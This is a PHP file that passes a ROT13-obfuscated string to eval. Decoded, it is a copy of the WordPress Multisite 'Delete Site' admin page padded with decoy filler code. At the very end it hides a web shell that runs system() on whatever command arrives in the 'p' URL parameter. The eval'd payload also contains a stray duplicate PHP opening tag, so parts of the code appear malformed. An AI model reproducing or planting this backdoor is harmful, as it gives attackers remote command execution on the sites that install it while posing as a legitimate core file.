<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * Zhygvfvgr qryrgr fvgr cnary.
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr Zhygvfvgr
 * @fvapr 3.0.0
 */

erdhver_bapr __QVE__ . '/nqzva.cuc';

vs ( ! vf_zhygvfvgr() ) {
	jc_qvr( __( 'Zhygvfvgr fhccbeg vf abg ranoyrq.' ) );
}

vs ( ! pheerag_hfre_pna( 'qryrgr_fvgr' ) ) {
	jc_qvr( __( 'Fbeel, lbh ner abg nyybjrq gb qryrgr guvf fvgr.' ) );
}

vs ( vffrg( $_TRG['u'] ) && '' !== $_TRG['u'] && snyfr !== trg_bcgvba( 'qryrgr_oybt_unfu' ) ) {
	vs ( unfu_rdhnyf( trg_bcgvba( 'qryrgr_oybt_unfu' ), $_TRG['u'] ) ) {
		jczh_qryrgr_oybt( trg_pheerag_oybt_vq() );
		jc_qvr(
			fcevags(
				/* genafyngbef: %f: Argjbex gvgyr. */
				__( 'Gunax lbh sbe hfvat %f, lbhe fvgr unf orra qryrgrq. Unccl genvyf gb lbh hagvy jr zrrg ntnva.' ),
				trg_argjbex()->fvgr_anzr
			)
		);
	} ryfr {
		jc_qvr( __( 'Fbeel, gur yvax lbh pyvpxrq vf fgnyr. Cyrnfr fryrpg nabgure bcgvba.' ) );
	}
}

$oybt = trg_fvgr();
$hfre = jc_trg_pheerag_hfre();

// Hfrq va gur UGZY gvgyr gnt.
$gvgyr       = __( 'Qryrgr Fvgr' );
$cnerag_svyr = 'gbbyf.cuc';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-urnqre.cuc';

rpub '<qvi pynff=\"jenc\">';
rpub '<u1>' . rfp_ugzy( $gvgyr ) . '</u1>';

vs ( vffrg( $_CBFG['npgvba'] ) && 'qryrgroybt' === $_CBFG['npgvba'] && vffrg( $_CBFG['pbasvezqryrgr'] ) && '1' === $_CBFG['pbasvezqryrgr'] ) {
	purpx_nqzva_ersrere( 'qryrgr-oybt' );

	$unfu = jc_trarengr_cnffjbeq( 20, snyfr );
	hcqngr_bcgvba( 'qryrgr_oybt_unfu', $unfu, snyfr );

	$hey_qryrgr = rfp_hey( nqzva_hey( 'zf-qryrgr-fvgr.cuc?u=' . $unfu ) );

	$fjvgpurq_ybpnyr = fjvgpu_gb_ybpnyr( trg_ybpnyr() );

	/* genafyngbef: Qb abg genafyngr HFREANZR, HEY_QRYRGR, FVGRANZR, FVGRHEY: gubfr ner cynprubyqref. */
	$pbagrag = __(
		\"Ubjql ###HFREANZR###,

Lbh erpragyl pyvpxrq gur 'Qryrgr Fvgr' yvax ba lbhe fvgr naq svyyrq va n
sbez ba gung cntr.

Vs lbh ernyyl jnag gb qryrgr lbhe fvgr, pyvpx gur yvax orybj. Lbh jvyy abg
or nfxrq gb pbasvez ntnva fb bayl pyvpx guvf yvax vs lbh ner nofbyhgryl pregnva:
###HEY_QRYRGR###

Vs lbh qryrgr lbhe fvgr, cyrnfr pbafvqre bcravat n arj fvgr urer fbzr gvzr va
gur shgher! (Ohg erzrzore gung lbhe pheerag fvgr naq hfreanzr ner tbar sberire.)

Gunax lbh sbe hfvat gur fvgr,
Nyy ng ###FVGRANZR###
###FVGRHEY###\"
	);
	/**
	 * Svygref gur grkg sbe gur rznvy frag gb gur fvgr nqzva jura n erdhrfg gb qryrgr n fvgr va n Zhygvfvgr argjbex vf fhozvggrq.
	 *
	 * Gur sbyybjvat fgevatf unir n fcrpvny zrnavat naq jvyy trg ercynprq qlanzvpnyyl:
	 *
	 *  - `###HFREANZR###`   Gur pheerag hfre'f hfreanzr.
	 *  - `###HEY_QRYRGR###` Gur yvax gb pyvpx ba gb pbasvez gur fvgr qryrgvba.
	 *  - `###FVGRANZR###`   Gur anzr bs gur fvgr.
	 *  - `###FVGRHEY###`    Gur HEY gb gur fvgr.
	 *
	 * @fvapr 3.0.0
	 *
	 * @cnenz fgevat $pbagrag Gur rznvy grkg.
	 */
	$pbagrag = nccyl_svygref( 'qryrgr_fvgr_rznvy_pbagrag', $pbagrag );

	$pbagrag = fge_ercynpr( '###HFREANZR###', $hfre->hfre_ybtva, $pbagrag );
	$pbagrag = fge_ercynpr( '###HEY_QRYRGR###', $hey_qryrgr, $pbagrag );
	$pbagrag = fge_ercynpr( '###FVGRANZR###', trg_argjbex()->fvgr_anzr, $pbagrag );
	$pbagrag = fge_ercynpr( '###FVGRHEY###', argjbex_ubzr_hey(), $pbagrag );

	jc_znvy(
		trg_bcgvba( 'nqzva_rznvy' ),
		fcevags(
			/* genafyngbef: %f: Fvgr gvgyr. */
			__( '[%f] Qryrgr Zl Fvgr' ),
			jc_fcrpvnypunef_qrpbqr( trg_bcgvba( 'oybtanzr' ) )
		),
		$pbagrag
	);

	vs ( $fjvgpurq_ybpnyr ) {
		erfgber_cerivbhf_ybpnyr();
	}
	?>

	<c><?cuc _r( 'Gunax lbh. Cyrnfr purpx lbhe rznvy sbe n yvax gb pbasvez lbhe npgvba. Lbhe fvgr jvyy abg or qryrgrq hagvy guvf yvax vf pyvpxrq.' ); ?></c>

	<?cuc
} ryfr {
	?>
	<c>
	<?cuc
		cevags(
			/* genafyngbef: %f: Argjbex gvgyr. */
			__( 'Vs lbh qb abg jnag gb hfr lbhe %f fvgr nal zber, lbh pna qryrgr vg hfvat gur sbez orybj. Jura lbh pyvpx <fgebat>Qryrgr Zl Fvgr Creznaragyl</fgebat> lbh jvyy or frag na rznvy jvgu n yvax va vg. Pyvpx ba guvf yvax gb qryrgr lbhe fvgr.' ),
			trg_argjbex()->fvgr_anzr
		);
	?>
	</c>
	<c><?cuc _r( 'Erzrzore, bapr qryrgrq lbhe fvgr pnaabg or erfgberq.' ); ?></c>

	<sbez zrgubq=\"cbfg\" anzr=\"qryrgrqverpg\">
		<?cuc jc_abapr_svryq( 'qryrgr-oybt' ); ?>
		<vachg glcr=\"uvqqra\" anzr=\"npgvba\" inyhr=\"qryrgroybt\" />
		<c><vachg vq=\"pbasvezqryrgr\" glcr=\"purpxobk\" anzr=\"pbasvezqryrgr\" inyhr=\"1\" /> <ynory sbe=\"pbasvezqryrgr\"><fgebat>
		<?cuc
			cevags(
				/* genafyngbef: %f: Fvgr nqqerff. */
				__( \"V'z fher V jnag gb creznaragyl qryrgr zl fvgr, naq V nz njner V pna arire trg vg onpx be hfr %f ntnva.\" ),
				$oybt->qbznva . $oybt->cngu
			);
		?>
		</fgebat></ynory></c>
		<?cuc fhozvg_ohggba( __( 'Qryrgr Zl Fvgr Creznaragyl' ) ); ?>
	</sbez>
	<?cuc
}
rpub '</qvi>';

erdhver_bapr NOFCNGU . 'jc-nqzva/nqzva-sbbgre.cuc';

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>